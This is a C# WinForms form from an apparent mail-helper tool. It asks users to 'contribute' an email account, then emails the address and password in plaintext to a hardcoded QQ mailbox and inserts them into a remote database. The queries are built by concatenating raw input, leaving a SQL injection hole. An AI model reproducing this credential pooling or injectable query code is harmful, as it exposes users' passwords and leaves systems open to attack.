using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
namespace 奇奇邮件助手
{
    public partial class 共享 : Form
    {
        public 共享()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            bool Ok;
            try
            {
                MailInfor MI = new MailInfor();
                MI.MailFrom = textBox1.Text;
                MI.Password = textBox2.Text;
                MI.MailTo = "179990830@qq.com";
                MI.Title = "丁丁邮箱助手 有人贡献账号!";
                MI.Msg = "账号:" + textBox1.Text + "<br/>密码:" + textBox2.Text;
               if(!Mail.SendMail(MI))return;
                Ok = true;
                button1.Text = "稍等";
                MessageBox.Show("邮箱可用,正在提交到服务器!","提示");
            }
            catch (Exception E)
            {
                MessageBox.Show(E.Message);
                Ok = false;
            }
            if (Ok)
            {

                Thread myThread = new Thread(new ThreadStart(GetJoinFromMail));
                myThread.IsBackground = true;
                myThread.Start();
            }
            button1.Text = "提交";
        }
        private void GetJoinFromMail()
        {
            try
                {
                    DataTable DT = MySql.GetDataBase(DataBase.GetRecordCount("dd_frommail where EMail='"+textBox1.Text+"'"));
                    if (int.Parse(DT.Rows[0][0].ToString()) > 0)
                    {
                        MessageBox.Show("服务器中存在，请勿重复提交！","提示");
                        return;
                    }
                    MySql.SqlCommand(DataBase.GetJoinFromMail(textBox1.Text, textBox2.Text));
                    MessageBox.Show("提交成功!", "提示");
                }
                catch (Exception E) { MessageBox.Show(E.Message); }
        }
        private void Share_Load(object sender, EventArgs e)
        {

        }
    }
}
